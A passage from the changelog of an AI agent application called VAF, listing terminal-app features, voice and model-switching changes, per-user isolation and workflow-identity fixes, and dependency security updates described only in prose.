  honest note when older ones were trimmed - `/export` writes the full
  record), and starting VAF with an existing session shows its conversation
  under the start banner. Replayed messages carry the time they were actually
  sent.
- **Automations and the tool catalog live in the terminal app's settings.**
  The Automations submenu shows what the classic menu showed - name, schedule,
  next run, enabled state - and selecting an automation switches it on or off;
  the storage folder opens from its own row. "Show All Tools" now opens the
  tool catalog instead of pointing at a restart.
- **The local model can be switched inside the terminal app, without losing
  the conversation.** "Select Active Model" now lists the models on disk with
  the active one marked, and picking one swaps the running agent live: the
  llama server is restarted with the chosen weights (it verifies which model
  it serves instead of blindly reusing whatever runs), the model-specific
  behavior follows the new weights, and the chat you were in stays. The swap
  waits until the new model has loaded and says so; while a reply is being
  generated it refuses instead of pulling the model out from under it. With a
  cloud provider selected, picking a file stores the choice for the next time
  the local provider serves - as the classic menu did. Only the model download
  still points at `vaf settings`.
- **The context limit, custom numbers, the microphone and About live in the
  terminal app now.** Four more settings rows stop pointing at `vaf settings`:
  the context limit offers the classic presets plus a free value and says
  honestly that it applies at the next start; the sub-agent timeout and the
  auto-open tab cap take any number in their classic ranges; the microphone
  submenu lists your real input devices and switches the live microphone at
  once; and About shows version, licence and links without leaving the app.

- **`/export <file>` writes the conversation from inside the terminal app** -
  markdown, or JSON when the filename ends in `.json`. The sessions panel now
  shows each session's id and a line of its summary, and `session current`
  prints the full id - the one thing `vaf run --session <id>` needs and the
  panel can only truncate. `session list` opens the panel instead of failing as
  an unknown id.

### Changed
- **Files VAF writes and reads back now say which format they are in.** Three
  stores kept no format identity of their own, so a reader had to guess from the
  keys it happened to find. The filesystem index cache carries a schema tag and a
  cache without the current tag is rebuilt instead of being read as if it were
  current - previously any JSON file at that path with a matching `os` key was
  accepted, including one written by an older build or another tool. Handoff
  bundles are written with a format tag, and bundles stored before the tag keep
  loading, so an open handover is not lost across an update. The audit timeline's
  hash chain starts from a versioned seed; timeline files written earlier start
  from the old seed and still verify as intact. One visible effect: after the
  update the filesystem index is rebuilt once on first use.
- **The tool-use log now covers every lane, not only chat.** `tool_use_*.log`
  records which session and which user scope were behind a tool call - the first
  place to look when isolation looks wrong. It was written from the chat loop
  only, so workflow steps, librarian sub-tools, training samples and tools added
  by an embedded application never appeared in it. The shared dispatcher writes
  it now, so all of them do. Two details worth knowing: a call that a permission
  check refused is logged too (a blocked attempt is exactly what this file is
  opened for), and the argument preview is sanitized the same way the live event
  stream already was, so a large field such as a file's contents is summarised by
  length and digest instead of pasted in whole. The coder's own tool loop does not
  use the shared dispatcher and is still absent.
- **A pip-installed VAF no longer writes logs into its own install directory.**
  The log directory search included the folder above the package, which in a
  checkout is the repository and in a pip install is site-packages. Installed
  copies now fall through to the normal application data directory; a checkout is
  unaffected. Set `VAF_LOG_DIR` to choose explicitly.
- **Tool-loading diagnostics no longer print underneath the terminal app.** The
  per-turn tool hot-reload, the custom-tool reload and a failed provider switch
  wrote their warnings straight to the raw terminal - under the full-screen app
  that corrupted the display mid-conversation. These messages now travel the
  same event lane as the rest of VAF's status output: the terminal app shows
  them as notes, the classic terminal shows the usual styled event line instead
  of a bare `[WARN] ...`, and the web log receives them too.
- **`vaf run --web` no longer starts the background service behind your back.**
  The README has always described this command as the dashboard WITHOUT the tray,
  and the lane hosts the dashboard itself - but if the background service was not
  running, the command quietly launched it as a detached process that outlived
  your session. Now the dashboard lives and dies with your session, as promised.
  If you relied on `vaf run --web` to bootstrap the persistent service, start it
  the intended way: `vaf tray`. A service that is already running keeps serving
  unchanged.

### Fixed
- **The sub-agent windows are dark in dark mode.** The librarian's file browser
  came up with bright, near-white panels: its window body, the file area behind
  the listing and the toolbar above it were painted with fixed colour values,
  and fixed values do not follow the theme. All sub-agent windows shared those
  values, so the coder, research, document and browser views were bright in the
  same places. They are now defined once and follow the theme. Light mode is
  unchanged.
- **Asking about files in one folder no longer answers about another one.** The
  librarian answers simple folder questions from a cached index in about a
  second. That index decided which folder to report from the file type in your
  question, not from the folder you named - so "how many PDFs are in Downloads"
  came back with the count from Documents, fluently and fast enough to look
  authoritative. Measured on one machine: 33 PDFs in Downloads, answer said 9,
  which is the Documents figure. The folder you name now decides the answer; a
  question with no folder gets the counts for every folder instead of a guess;
  and where the index has no figures at all it stays quiet and lets a real
  search run rather than reporting a zero nobody counted.

- **Clearing the chat while an answer is still arriving now discards that
  answer.** The reply kept streaming into the freshly emptied conversation,
  so a paragraph appeared with no question above it - belonging to a history
  that was deleted a moment later anyway. The terminal app drops it and says
  so.
- **The model list no longer offers the vision helper file as a model.** When
  local image understanding is set up, VAF downloads a second file next to the
  model - the "projector" that lets the model see pictures. It ends in `.gguf`
  like a model, so every model picker (terminal app, classic settings, web UI)
  listed it as a choice; picking it left the local server unable to start with
  a cryptic `unsupported model architecture: 'clip'`. Those files are filtered
  out everywhere now, and a configuration that already points at one falls
  back to a fitting model with a clear message instead of failing to start.
- **Switching the local model keeps your context size and GPU setting.** The
  server was restarted with the defaults instead of your configured values, so
  a large context window silently shrank whenever the model changed - while
  the setting still showed the old number.
- **Setting a plan in the terminal app works on the first try.** Tools run
  on the terminal app's worker thread, and that thread never learned which
  session it serves - so working-memory writes (plan, notes, tasks) landed
  in a global store while the plan check read the session's own, empty one.
  The agent then got "set a plan first" bounces despite having just set one,
  retried with reworded plans, and finally got through only because the
  check gives up after three blocks. Every worker thread now knows its
  session, so the plan lands where the check looks - first try.
- **An edit-only coding run no longer reports failure.** The coding agent
  counted only files it CREATED, so a task like "add a section to the
  README" ended with "Task Failed - No files were created" over a
  successful, even committed edit. When nothing was created, the verdict
  now asks git what changed since the run began; edits count as the
  outcome, and only a run that truly changed nothing keeps the honest
  failure message.
- **The coder works in the folder you started VAF in.** Open a terminal in
  your project (an IDE terminal counts), run `vaf run`, ask for a code
  change - the coding agent now works on THAT project. Before, the separate
  terminal it runs in started in your home directory instead of your
  project, so the project-detection never matched and the work landed in a
  fresh `VAF_Projects` folder. The main agent hands its working directory
  to every spawned sub-agent and workflow now; explicit paths in the task
  still win, and "create a new project" still gets a fresh folder.
- **Running project tests in the sandbox works on a fresh container.** The
  sandbox image ships without pytest while pytest is the default test
  command, so every container recreation broke "run the tests" with "No
  module named pytest" until someone installed it by hand. The runner now
  installs pytest on demand (once per container) and reports honestly when
  it cannot.
- **Old chats without an owner no longer show up in every user's list.**
  Sessions created before per-user ownership existed carried no owner mark,
  and the session list showed such sessions to every signed-in user - their
  titles were visible to people they never belonged to (opening them was
  always refused). On startup VAF now marks these legacy chats as the
  machine owner's, which is the only person they can belong to, and they
  disappear from everyone else's list.
- **The terminal app starts the Docker services, and a sleeping memory
  database is named instead of impersonating an empty memory.** Quitting the
  desktop tray stops the service stack (database, sandbox, speech) - so a
  terminal-only session afterwards ran against a stopped memory database,
  and asking the agent what it remembered got "I have no stored information"
  over a database full of it. `vaf run` now brings the stack up in the
  background exactly like the tray does (the whole start/stop logic lives in
  one place now instead of only inside the tray), and when the database
  really is unreachable, the memory search says so - the agent will tell you
  the memory stack is down rather than declare itself amnesic. Without
  Docker, everything keeps working as before, minus the services.
- **Typing anything now interrupts the agent's speech in the terminal app.**
  The classic terminal always treated any input as "stop talking, I have
  something to say" - spoken output is asynchronous and routinely outlives the
  reply that produced it. The full-screen app only silenced speech when a new
  turn actually started, so a slash command, a typo, or a message queued behind
  a running turn left the agent talking over you. Every submitted input now
  stops running speech before it is even parsed, silently; the explicit `halt`
  still says "speech stopped".
- **The settings no longer advertise a wake word.** Both terminal settings
  menus carried "Wake Word" labels pointing at a feature that was removed from
  VAF months ago (the always-on listener was dropped in February together with
  its dependency). The dead row and the labels are gone; if a wake word
  returns, it returns as a real feature, not as a menu entry that leads
  nowhere.
- **Closing the "what's new" window no longer wipes parts of your profile.** Dismissing
  the update announcement sent a single value to the server, but the profile endpoint
  treated everything the message did not mention as "set this to empty" - so your main
  messenger, city, country, timezone and date and time format were silently cleared, and
  the change was recorded as if you had edited it yourself. It happened on every release.
  Emptying a field on purpose still works: the settings forms send it as an explicit
  "make this empty" so it cannot be confused with a field that was simply not part
  of the request.
- **The profile history says who changed something, and admits when a value was
  removed.** Entries recorded only what was touched, and always said "updated" even when
  a field had been emptied. Both made the earlier bug look like a manual edit.
- **Security logs are kept for two weeks instead of two days.** They sit in the same
  folder as ordinary logs and follow the same naming, so the routine cleanup deleted them
  after 48 hours. Nobody noticed, because a missing log looks exactly like a quiet period.
  They now have their own retention (`security_log_retention_days`, default 14).

- **Voice input works in the terminal app.** Pressing `l` (or `listen`) opens the
  recording overlay with a live level meter showing what the microphone actually
  hears, and the transcribed sentence is sent as your message - the same flow the
  classic terminal always had, and the conversation shows your words above the
  answer. If you would rather check the transcription first, turn on "Voice:
  review before send" (Settings, Voice): the sentence then lands in the input
  box for you to read and fix, and enter sends it. Escape cancels the recording
  itself, not just the window. The speech resources are prepared at startup
  while the terminal is still plain (Piper voice download, microphone check with
  an honest "pyaudio is not installed" where that is the reason, language
  detection warmup), so the first use does not stall mid-chat.
- **Voice capture works on machines using the Docker speech stack - which is the
  default.** Recording answered "no speech detected" within half a second, in the
  terminal app and the classic lane alike: with the default speech engine the
  microphone was simply never set up, because the engine choice was misread as
  "no local capture needed" - it only decides where the audio is transcribed.
  The microphone is now prepared when recording starts, and the recording goes to
  the transcription lane you chose: your cloud STT provider if configured,
  otherwise the local Whisper container - the same path Telegram and WhatsApp
  voice messages take. It is never quietly rerouted to Google's free web API, and
  a dead speech stack is named as what it is instead of "no speech detected".
- **The classic recording line no longer prints formatting tags.** The level
  meter wrote styling markup to the raw terminal, so the classic lane showed
  literally "[bold red]● SPEAKING[/bold red]" while recording - since the day it
  was written. It now paints plain text.
- **Browsing themes no longer changes your startup theme.** Pressing `t` (or
  `theme <name>`) now switches the look for the current session only, exactly as
  the classic terminal always did - the Settings > Theme row is what saves a
  choice. Until now every press wrote the config immediately, so looking through
  the catalog once left the LAST theme in the list as your new default: matrix,
  which looks like a plain green terminal - and the next start seemed to have
  lost the VAF theme entirely. The switch note now says it changed this session,
  and where to save.
- **Workflow variable filling is deterministic, and its log tells the truth.**
  When a matched workflow was missing inputs, which template default got applied
  could depend on Python's hash order (a fill loop removed items from the list it
  was walking), the log promised "using defaults" at a point where no default
  could exist, and the same missing input was reported twice. Defaults now fill
  first, the per-variable repair only handles inputs without one, and a single
  line says what actually happens: the turn falls back to the agent.
- **German answers are asked to use real umlauts again.** For a while the assistant
  had taken to writing "fuer" and "laeuft" instead of "für" and "läuft", sometimes
  switching between both inside one sentence. That comes from the language model, not
  from VAF, and it feeds itself: the model reads its own earlier replies and copies the
  habit. The instruction VAF sends with every turn now asks for proper German spelling
  explicitly, which curbs it. It will not be perfect, and a fresh chat shows it best.
- **A bundled browser script that nobody used is gone.** It was a copy of a third-party
  fingerprinting library, 43 KB, kept in the tree long after VAF stopped injecting it,
  and it carried no author credit. Deleting it is the honest repair: nothing changes for
  you, and one piece of somebody else's code no longer travels with every download.
- **The bundled PDF viewer now ships the license it is used under.** VAF includes a copy
  of Mozilla's pdf.js worker so documents can be displayed; its license asks that
  recipients get the license text itself, and that text is now included rather than only
  linked.
- **A comment claimed the recommended voice model was Apache-licensed. It is not.** The
  Gemma weights come under Google's own terms with usage restrictions. VAF never shipped
  the weights and still downloads them only when you choose that model, so nothing about
  your install changes - but the note in the code was wrong and is corrected.

- **Setting the sub-agent timeout to "no limit" no longer arms a zero-minute
  timeout.** The row stored 0 minutes while the timeout stayed switched on - and a
  zero-minute timeout means every running sub-agent is stopped at the next cleanup
  pass. Choosing "no limit" now switches the timeout off, exactly as the classic
  menu always did, and choosing a duration switches it on.
- **The microphone list selects the device you picked.** The classic picker
  numbers the list by position, but the list is filtered - so on machines with
  virtual audio devices the position could name a different microphone than the
  one shown. The terminal app reads the device number printed in each entry.
- **A long conversation no longer animates dozens of invisible dots.** Every reply
  in the terminal app carries the agent's living dot, but only the newest one shows
  it - the hidden ones kept animating anyway, ten times a second each, so a long
  session burned more and more CPU drawing into nothing. The visible dot animates
  exactly as before; the hidden ones now rest until it is their turn again.
- **`vaf update` now tells you why it could not answer.** Three different situations
  used to collapse into one sentence, "offline, or none published yet", whose two
  halves call for opposite reactions. The real case that exposed it was neither:
  GitHub allows unsigned-in requests only 60 per hour for a whole network address,
  so any busy tool on the same connection could make the updater claim there was no
  release minutes after one went live. It now says which it is - rate limit (with
  the time to try again), unreachable, or genuinely no release - and a plain
  permission error is not dressed up as a rate limit.

### Security
- **DOMPurify updated (3.4.13).** A sanitizer bug could leave a removed
  element's hidden children able to run scripts in applications that use one
  specific advanced mode. VAF's interface never uses that mode - the library
  only arrives through the code editor and the PDF export - so no VAF
  installation was exposed; the update keeps the dependency clean regardless.
- **PostCSS updated (8.5.26).** The build toolchain's CSS processor could be
  tricked into reading arbitrary `.map` files when it processes CSS from an
  untrusted source without a known input file, disclosing their contents in
  the generated source map. VAF only ever runs it over its own stylesheets at
  build time, so no VAF installation was exposed - the update keeps the
  dependency clean regardless.
- **js-yaml updated (4.3.1).** The YAML parser that the linter uses to read its
  own configuration resolved ordered maps in quadratic time, so a crafted
  document could stall the process that parses it. It reaches VAF only as a
  build-time dependency of ESLint and never sees anything but VAF's own config
  files, so no VAF installation was exposed - the update keeps the dependency
  clean regardless.

## [0.1.0a20] - 2026-08-05

### Added
- **The terminal now shows how far a sub-agent has got.** The task line above the
  prompt showed only that something was running and for how long. It now also shows
  the count, like `2/5`, for the two sub-agents that plan their work upfront: the
  coder and the document agent. It is a count and never a percentage, because a
  coding run legitimately finishes below its total when a task fails, and a bar that
  has to reach 100% would have to lie about that. The three sub-agents that do not
  plan upfront show nothing rather than a made-up number.
- **A session now opens by telling you where you are.** Instead of a bare "new
  session" line, `vaf run` greets you with the Veyllo mark and the facts beside it,
  centred on screen: version, your agent's name, the session name and id, the
  active model, the local date and time - and the one line that was missing
  entirely, how to get back into an earlier conversation.
- **Most settings are editable inside the terminal app now.** Rows that used to say
  "use `vaf settings`" work where they can: the AI provider and its model take effect
  on the running agent without a restart, and the speech engine, input language,
  sub-agent provider, sub-agent timeout, auto-open tab limit and local-server
  auto-start are simply set. The three that genuinely need a fresh start - the local
  model, the context limit and downloading a model - still point at `vaf settings`,
  and now say why rather than just deferring.
- **Sessions you never wrote in do not pile up any more.** Opening `vaf run` and
  closing it again left an empty session behind every time, and the list filled up
  with rows that held nothing. An untouched session is now dropped when you leave
  it, whether you quit or load a different one; anything you actually wrote in is
  kept as before.
- **You can switch sessions from inside the terminal app.** The sessions panel was
  a list you could look at but not use; the only way back into an earlier
  conversation was quitting and passing its id on the command line. Ctrl+S now
  opens it, the arrow keys walk it and enter loads the one you picked. And when
  you leave, VAF prints the session id and both commands that bring you back,
  instead of letting it disappear.
- **The prompt remembers, suggests and completes again.** The full-screen `vaf run`
  had a plain text box: no history on the arrow keys, no inline suggestion, no
  completion for commands or file paths. All three are back, and they share the
  older interface's history file, so your past messages are the same list whichever
  way you start VAF. Typing `/` or `@` opens a menu you can walk with the arrow
  keys; while it is open Enter picks an entry, and the next Enter sends.
- **The terminal commands are back, and all of them work in both interfaces.** Typing
  `clear`, `tools`, `undo`, `restore`, `context`, `halt` or `restart` in the new
  full-screen `vaf run` used to send the word to the model as a chat message. They
  are commands again, alongside the ones that already worked, and a mistyped
  `/command` now says so (with the closest match) instead of costing a turn.
  Arguments work too: `theme dark` picks that theme instead of cycling, and
  `session <id>` loads that session. The ones that cannot be undone - clearing the
  conversation, rolling back files, restarting - ask first. Behind this, the command
  list lived in six places that had already drifted apart: the older interface
  offered completions for words it could not run, and ran a word it did not offer.
  There is one list now, and both interfaces read it.
- **Answers in the terminal are formatted again.** The full-screen `vaf run` showed
  the model's markdown verbatim: literal asterisks around bold text, raw list
  markers, and code fences as three backticks and unhighlighted text. Headings,
  lists and emphasis now render, and code blocks are syntax-highlighted and follow
  the active theme. Long answers stream just as smoothly as before, because the
  text is redrawn on a fixed rhythm instead of on every word.
- **Tool cards in the terminal now show what the tool actually returned.** The
  observation events an application can subscribe to reported that a tool finished,
  how long it took and whether it failed, but never what came back - so anyone
  building on VAF had to correlate results out of debug log files, and three places
  inside VAF carried their own private copy of the result for the same reason, each
  cut to a different length. The `tool_end` event now carries a `result` field
  (capped at 800 characters, always a string, safe to serialize). In `vaf run` the
  tool card is no longer an empty fold: it opens onto the result.
- **`vaf run` opens a full-screen terminal app.** The terminal chat is no longer a
  scrolling prompt: it is a full-screen app with a live transcript (strictly
  chronological, streamed answers with the model's reasoning as a separate muted
  think block), tool cards, event narration, the sub-agent status line, the
  context-usage bar, the agent's animated avatar beside the newest reply, and
  keyboard-complete overlays for settings, model, history, sessions and help. The
  classic run-loop letters (`s`, `c`, `t`, `h`, `l`, `?`) still work typed into the
  prompt, as do slash commands and `@file` attachments. Tool confirmations finally
  work in the terminal: previously they silently waited on the web dashboard and
  timed out after five minutes if no browser was open; the app shows the question
  and answers it in place. The previous interfaces stay available - `vaf run
  --classic` for the plain prompt, and the new `tui_mode` config key to pick the
  default lane (`vaf run --web` keeps the previous lane, which owns the web-server
  startup). Voice capture and provider switching inside the app land next.
- **You can now ask for one completion without a conversation.** Building something on
  VAF that just needs one answer - a classification, a summary, a commit message -
  meant either running a full chat turn (history, tools, memory, routers) or
  hand-rolling the backend call, and about twenty places inside VAF had done exactly
  that, each slightly differently wrong. `agent.complete(prompt)` is one call with the
  agent's configured backend: it never enters the conversation, runs no tools, writes
  no memory, strips model reasoning from the result, and returns text or None - never
  an exception and never an error message dressed as an answer. The same primitive now
  powers the tools' own utility completions and the CLI features below.
- **An application built on VAF now decides which tools each account may use - with one
  registered resolver instead of VAF's own user database.** The per-account tool allowlist
  used to be wired straight to the product's auth DB inside the dispatch pipeline, so an
  application embedding VAF got a check it could neither feed nor replace.
  `set_account_allowlist_resolver` is now part of the public interface: register one
  function that answers "which tools for this account" from your own storage, and it is
  enforced everywhere the pipeline runs - before the per-call authorizer, so an `allow()`
  cannot lift an account-level ban, and inside the coding agent, where the answer crosses
  into the child process as data. VAF's own product registers its resolver through the
  same primitive, and the pipeline no longer imports the product's auth layer at all (a
  test now keeps it that way). A registered resolver that crashes refuses rather than
  quietly enforcing nothing; registering nothing means unrestricted, as before.
- **A tool can now say that it touches files, and the per-user boundary is installed for
  it.** Building something on VAF that reads or writes a user's files meant declaring who is
  calling and then writing the confinement yourself, inside every tool, exactly right, every
  time. Eleven built-in tools did precisely that, across five files, and five of the
  twenty-two that needed it had simply forgotten. A tool now declares `file_access = "read"`
  or `"write"` next to its identity, and the boundary is applied around it on every path -
  including when something calls the tool directly, with no dispatcher involved. Declaring a
  mode without the matching identity is refused when the class is defined, rather than
  quietly doing nothing later: a tool that receives no identity would otherwise run
  completely unconfined while looking confined. A boundary inside another can only narrow
  what it inherited, never widen it.
- **A new example runs without needing a model at all.**
  `examples/07_tool_caller_and_authorizer.py` shows the two pieces below in one runnable
  script: running a tool with VAF's rules but no conversation, and deciding about each call.
  It needs no API key, no provider and no network, which makes it the quickest way to check
  a fresh install actually works.
- **An application built on VAF can now decide about each tool call itself.** Until now the
  only way to keep a tool away from someone was to leave it out entirely - a choice made once
  at startup, for everybody. `set_tool_authorizer` is asked before every call and can refuse
  it, insist on a confirmation question, or let one through without the question. It sees who
  is calling and what the call would do, so decisions like "this customer's plan has no shell
  access" or "not that file, it belongs to someone else" are finally expressible. Refusing is
  the safe direction throughout: an authorizer that answers nothing changes nothing, and one
  that crashes refuses rather than waving the call through.
- **You can now run a single tool without starting a conversation.** Building something on
  VAF that just needs a tool done - a scheduled job, a queue worker, your own agent loop -
  meant either wrapping a whole chat agent around it or rebuilding the safety checks by
  hand, and rebuilt checks drift apart from the real ones. `ToolCaller` is now part of the
  public interface, and it is the exact same one the agent itself uses: the same permission
  rules, the same confirmation question, the same identity handling, the same time limits.
  Documented in the embedding guide.

### Changed
- **An embedded agent created with the machine owner's account key now reads the
  owner's profile** instead of an empty per-key workspace. Keys belonging to anyone
  else are unaffected and still never resolve to the owner.
- **The repository root is quieter.** The contributor, conduct and security documents
  moved into `.github/`, where GitHub still finds them, and the commercial terms and
  third-party inventory moved to `docs/legal/`. The separate `ruff.toml` is gone; its one
  setting lives in `pyproject.toml`. Nothing a user runs changed: the installers, the
  start scripts and the licence files stayed exactly where they were.
- **The default look is monochrome.** The terminal theme is a black-to-white ramp
  now, so nothing in the frame competes with what the agent is actually saying, and
  the agent's white dot is the brightest thing on screen. Success, warning and error
  keep a colour, muted enough to belong but distinct enough to still be read at a
  glance. Both terminal interfaces share the theme, so both change together, and
  whichever one you pick is the one you get next time. The light theme is gone:
  it sat at the end of the cycle, so pressing the theme key often enough landed
  on it and stuck, and on a white background the agent's white mark and every
  white accent simply disappeared. Anyone who had it selected comes up on the
  default instead.
- The terminal app's bottom row no longer cuts itself in half. The key hints and
  the context usage share one line and do not fit together below roughly 120
  columns, and the overflow used to be resolved by clipping - mid-label, so
  `/exit` appeared without its `Quit` and on a busy context bar even `Help` was
  gone. Now the context bar gives up its token counts first and hint pairs drop
  whole, so whatever is on the line is readable.
- The terminal transcript follows a streaming answer again. It scrolled when a
  message was mounted but not while one grew, so a long reply ran on below the
  fold while the view sat on its first lines. It now follows the text - and
  stops following the moment you scroll up to read something, instead of
  yanking you back down.
- Long command descriptions in the terminal help wrap under themselves instead
  of continuing beneath the key column, where they read like another command.
  The session list, the start block and the mark itself also survive a narrow
  window now rather than losing their last characters.
- The mark in the terminal's start block is now the Veyllo logo converted to
  terminal art rather than drawn in solid blocks.
- The README opens on the mark rather than on an ASCII wordmark, and shows the
  terminal and the web UI as one image above the installation steps.
  The desktop and terminal modes each show what they look like.
- **Workflow steps now pass the same security checks as chat.** A step used to run its
  tool directly, skipping every rule a chat turn answers: admin-only tools, channel
  policy, the per-user tool selection, and the veto an application embedding VAF can
  attach. Steps now run through the shared dispatch pipeline, so all of those hold
  inside workflows too. Three deliberate differences remain: the confirmation question
  stays off for workflows (they run unattended - taking that away is its own decision),
  the heavy sub-agent steps of a temporary workflow still run as child processes outside
  the step pipeline (their internal tools remain constrained separately), and a step
  whose tool crashes now fails that step and lets the workflow branch, instead of
  aborting the whole run. Malformed step arguments are now refused cleanly before the
  tool runs. The existing rollback switch restores the entire previous behaviour if
  needed.
- **A workflow now runs as the person who started it, by default.** Until this release a
  saved workflow always acted as the machine owner, whoever ran it: its files went to the
  owner's folders, its GitHub calls used the owner's account, and anything it created was
  filed under the owner. That was switchable before and is now the default. What changes in
  practice is that 47 further tools finally learn who is running the workflow - files,
  GitHub, automations, skills and reading messages among them - and none of them lose an
  identity they already had. If a workflow of yours relied on reaching the owner's files by
  an absolute path or a folder name like `Desktop/...`, that step will now be refused for
  anyone who is not an administrator; the setting `workflow_identity_injection` set to
  `legacy` restores the previous behaviour.
- **Workflows carrying an identity now pass it to far more tools.** The setting introduced
  in 0.1.0a19 only reached a fixed list of tools; set to `declared` it now asks each tool
  what it needs, the same way a normal chat message already did. In practice that means
  files, GitHub, the browser, skills and automations finally know who is running the
  workflow, and mail learns the person's role rather than only their name. Nothing loses
  access - every tool that had an identity before keeps exactly the one it had. Still off
  by default (`legacy`).

### Removed
- **Three launcher scripts that nothing called.** `stop_vaf.sh`, `launch_vaf.scpt` and
  `Start VAF.command` were not referenced anywhere: not by the installers, not by the
  Linux desktop entry or the systemd service (which stops VAF by signalling the process),
  not by any documentation. On macOS the installers already build a proper `VAF.app` that
  launches from wherever the project actually lives, while `launch_vaf.scpt` still assumed
  it sat in `~/VAF`. Stopping a persisted server is documented separately and unchanged.

### Fixed
- **`vaf run --web` now says that it changes the interface.** The flag has always
  routed to the previous prompt interface, because that is where the web server and
  its watchers are wired, but it did so without a word: you typed a flag you had used
  for months and got a different-looking VAF with no reason given. It now says so at
  startup, and only when the interface actually changes.
- **The terminal app asks for an API key instead of storing a provider that cannot
  work.** Switching to a provider you had no key for wrote it to the config anyway
  and told you to restart, which was the one thing that could not help: the next
  start came up on a provider with no way to reach it. Now a provider with no key
  opens a masked key field, `k` on a provider row opens it for a key you want to
  replace, and the key is checked with one real request before anything moves. A
  key that does not verify is kept but the provider stays where it was, because
  that request can fail on the network as easily as on the key. The key itself is
  never shown, never written into the conversation, and the check runs in the
  background so the app keeps responding while the provider answers.
- **Choosing a provider for sub-agents in the terminal app now actually moves them.**
  The row wrote the provider's name but not the switch that turns the choice on, so
  it reported success, moved its marker onto your choice, and every sub-agent went
  on using the main agent's provider. Six places worked out that pair by hand and
  now ask one function, so the two halves cannot drift apart again. Two more things
  come with it: the older `vaf settings` menu announced the chosen provider in its
  panel even when the switch was off, and it does not any more; and picking a
  provider you have no API key for is now refused in the terminal app too, instead
  of being stored and failing inside every sub-agent afterwards.
- **VAF no longer names one theme while showing another.** If your saved theme was
  not the default, the terminal app's Theme list put its marker on the default row,
  and the `vaf settings` menu labelled the default too, while the screen was painted
  in the theme you had actually chosen. The name came from a value that only two of
  the four terminal lanes ever loaded from your config; every surface now reads the
  saved choice, and a `--theme` flag reaches them all. Worth knowing, because it made
  the above look like the theme was not applied at all: `t` writes your choice
  immediately, so cycling through the themes to look at them leaves you on the last
  one you stopped at, and that is what the next start uses.
- **A timer set in the terminal app now actually arrives.** Asking for a reminder
  in `vaf run` set the timer, said so, and then nothing happened when it elapsed -
  the terminal app never looked at the queue the timer fires into, so it expired
  in silence. It now shows an amber card with what woke the agent, followed by the
  agent's answer. A timer belonging to a different conversation is dropped with a
  note saying so, rather than swapping the conversation you are reading.
- **A note the agent saves for itself now belongs to the person it was talking to.**
  On an installation with more than one account, a note written while a background
  pass happened to be running was filed under that pass's account instead - and notes
  are read back into that account's next background pass as instructions to follow.
- **Background thinking no longer changes what a waiting person's turn is allowed to
  do.** While it ran, anyone chatting at the same time silently got a fraction of the
  tool budget, a cap after three lookups, no retry when the model returned nothing -
  which is what leaves the web page stuck on a loading block - and a refusal from
  their own "update what I'm working on" action. Each of those limits is meant for
  the background pass alone.
- **The program keeps asking you for confirmation after an automation has run.**
  The first automation switched the whole program into a mode that never prompts and
  never switched it back, so from then on confirmations a person should have seen were
  answered without them.
- **A scheduled automation can no longer put its output in someone else's place.**
  On an installation with more than one account, a background task had no session
  of its own and quietly adopted whichever conversation was last active in the
  program. Its document was then created inside that person's workspace folder,
  announced in that person's browser, and their conversation was permanently
  re-pointed at the folder. In the same run their Stop button would cancel the
  background task, while the task's real owner could not stop it at all. A run now
  states which conversation it belongs to - a scheduled task says "none" - and
  nothing falls back to a program-wide value. Single-user installations were never
  exposed to the cross-account part of this.
- **An update can no longer make sub-agent results stop arriving.** If a newer VAF
  wrote one entry into the shared sub-agent file and an older one read it, the older
  one gave up on the entire file rather than on that one entry - so every finished
  sub-agent result was silently dropped, with nothing in any log. This only needed
  one mixed-version moment to trigger and did not repair itself.
- **A coding run without an open Web UI no longer does the work of drawing one.**
  Every loop iteration and every written file gathered a full project snapshot -
  several `git` calls and a walk of the project tree - before checking whether
  anyone was watching. On the terminal, where nobody is, that work was thrown away.
  The librarian did the same with a filesystem scan that also wrote a cache file.
- **A skill you shared with one person is visible to that person again.** On the
  lanes that stored the account key as a parsed object rather than as text, the
  visibility check compared two different kinds of value and never matched, so
  `use_skill` and `read_skill` answered "not available to you" to the very person
  the skill had been shared with.
- **The machine owner is no longer locked out of their own files.** If the owner
  key was ever stored in a different spelling than the one VAF generates, the
  terminal app rewrote it on startup and then compared the rewritten value against
  the stored one. It never matched, so the owner was treated as a guest: jailed out
  of their own project folder and refused on their own files.
- **A timer or automation can no longer leave a conversation without an owner.**
  Stamping the owner onto a fresh conversation could fail silently on the
  background lanes, and a conversation with no owner loses the channel it came
  from, so a later sub-agent result had nowhere to go back to.
- **A background "thinking" run no longer borrows the machine owner's profile.**
  After loading a person's chat history, the run took its identity from that
  conversation; if the conversation had no name stored, three fallbacks quietly
  substituted the owner's, and the owner's personal profile went into a different
  person's prompt and into the message sent to them.
- **An elevated permission no longer survives from one queued message into the
  next.** The role was only ever cleared on two of the paths that start a turn.
- **A damaged owner key in a restored or hand-edited automation file no longer
  resolves to the machine owner.** It gets its own isolated bucket instead.
- **The classic CLI no longer loses its prompt for good after a second message
  from the web UI.** Once two messages had been queued for the same conversation,
  the terminal dropped to a plain `Message:` line with no completion, no history
  and no voice, and stayed there until you restarted it. Behind it, a finished
  task was never marked finished, so the conversation looked permanently busy and
  every later message for it was held back with nothing to release it. Both the
  hold and the crash it caused are gone, and any lane that consumes queued work -
  including ones written later - is covered by the same fix rather than having to
  remember the release itself.
- **A long answer no longer streams past the bottom of the terminal app.** The
  transcript stopped following after the first few lines and the reply ran on
  below the fold, so you had to scroll down yourself to see the agent finish.
  Whether it happened at all depended on your terminal size, which is why it
  looked intermittent. Scrolling up still leaves you where you are reading, and
  coming back down picks the answer up again.
- **On Windows, attaching a file with `@` works.** Typing `@C:\Users\me\notes.txt`
  attached nothing and left the path sitting in your message: the reference stopped at
  the drive letter's colon, so VAF only ever saw `@C`. Relative paths and every other
  platform were unaffected, which is why it went unnoticed.
- **The licence note now points somewhere you can actually go.** `vaf info` and the
  licence panel in settings told you to read `LICENSE`, `LICENSING.md` and
  `COMMERCIAL.md`, which is fine in a checkout and useless after `pip install vaf`:
  the licence texts live inside the package metadata there, and the commercial terms
  were never part of the distribution at all. Both now show a link instead.
- **VAF understands German written without umlauts.** Plenty of people type "taeglich"
  or "ueberweisung" because their keyboard has no umlaut keys, and language models have
  lately taken to writing German that way too. Everything VAF matches on - the words that
  start a workflow, the risk check on an outgoing mail, the phishing score, the guard that
  catches the assistant claiming success it never earned - looked only for the spelling
  with umlauts and quietly did nothing for the other one. Both spellings now reach the
  same place. The guard against unearned success claims is the one that mattered most: it
  had been blind to exactly the models it exists to catch.
- **Sending a message no longer stalls while VAF saves what it learned.** Every
